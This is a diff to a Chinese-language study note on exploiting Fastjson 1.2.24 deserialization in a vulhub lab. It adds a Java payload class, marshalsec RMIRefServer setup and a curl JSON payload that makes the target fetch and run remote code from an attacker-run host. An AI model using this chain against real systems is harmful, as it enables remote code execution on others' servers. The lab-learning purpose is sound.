@@ -388,21 +388,59 @@ public class Test2 {
 }
 ```
 #### 方式2
-利用vulhub的fastjson靶场.
+利用vulhub的fastjson靶场中的思路.
 
-先如上例所示，编写一个Touch.java，并编译为Touch.class.
+1.编写一个TouchFile.java，执行`javac TouchFile.java`编译为TouchFile.class.（最好用jdk8）
+```java
+// javac TouchFile.java
+import java.lang.Runtime;
+import java.lang.Process;
 
-然后启动自己的C2server，使Touch.class可通过http下载 。简单的httpserver 可以在Touch.class目录位置，运行`python -m http.server 8899`，启动一个简单httpserver作测试用。
+public class TouchFile {
+    static {
+        try {
+            Runtime rt = Runtime.getRuntime();
+            String[] commands = {"touch", "/tmp/success"};
+            Process pc = rt.exec(commands);
+            pc.waitFor();
+        } catch (Exception e) {
+            // do nothing
+        }
+    }
+}
 
-使用marshalsec对Touch.class进行处理（添加RMIServer实现）：
+```
+
+
+说明：这个文件来自vulhub 中对应文件目录下的README，它没有main函数，理论上也是可以`java TouchFile`执行的，但实际中很多jdk会报错。我试了加上main函数并没有影响。
+
+
+
+2.然后启动自己的C2server，使Touch.class可通过http下载 。简单的httpserver 可以在Touch.class目录位置，运行`python -m http.server 8899`，启动一个简单httpserver，作为对“恶意文件”TouchFile.class的下载服务器。假设该服务器的ip为c2-server-ip。
+
+使用marshalsec对Touch.class 转向（添加RMIServer实现），此时运行RMIServer的主机可视为最前端的跳板C2 server：
 - 从 github下载marshalsec ,进入所在目录
 - 使用maven安装: `mvn clean package -DskipTests`
 - 在target目录下找到相应的jar文件
-- 使用方法： `java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]`, 
-- 此处具体命令： `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://localhost:8899/TouchFile.class" 9999`
+- 使用方法： `java -cp some-path/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]`, 
+- 此处具体命令： `java -cp /opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://c2-server-ip:8899/#TouchFile" 9999`
+  - 注意RMIRefServer 后url的写法#加class文件。
+  - 假设该跳板机的ip为：jump-c2-server-ip
 
-使用下列命令上传json: 
-`curl http://vulhub-ip:8090/ -H "Content-Type:application/json" --data '{"rand1": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://c2_ip:8899/TouchFile.class","autoCommit": true}}'`
+
+3.启动vulhub中fastjson目录下的1.2.24版本靶场。启动后可访问 http://victim-host-ip:8090，会返回json样例。
+
+4.在跳板机或其它前端C2上发起攻击测试：例如使用curl：`curl http://victim-host-ip:8090/ -H "Content-Type:application/json" --data '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://jump-c2-server-ip:9999/TouchFile","autoCommit":true}}'`
+
+在我个人的实验中，上面的请求提交后，会在victim-server上看到500报错以及抛出的java异常，提示错误提交属性autoCommit，但是可见c2-server-ip:8899下有Get请求TouchFile，但是TouchFile中想要执行的动作并未完成。即未在victim-server主机下看到新建文件/tmp/success。
+
+
+
+>``TODO 原因待查...``
+>问题分析思路：
+>- 怀疑 JdbcRowSetImpl 不可用，经测试更换为JdbcRowSet后不报错，但仍无法看到新建文件/tmp/success。
+>- 或 autoCommit 不可用，通过自己编程调试，发现如果type不为 JdbcRowSetImpl ，任意属性都可提交，一个autoCommit影响应该不大，而且只有使用>JdbcRowSetImpl和autoCommit时，才能看到服务器上GET请求了TouchFile。
+>- 需要进一步了解JAVA ROP 和相关类。
 
 
 ### com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl利用链
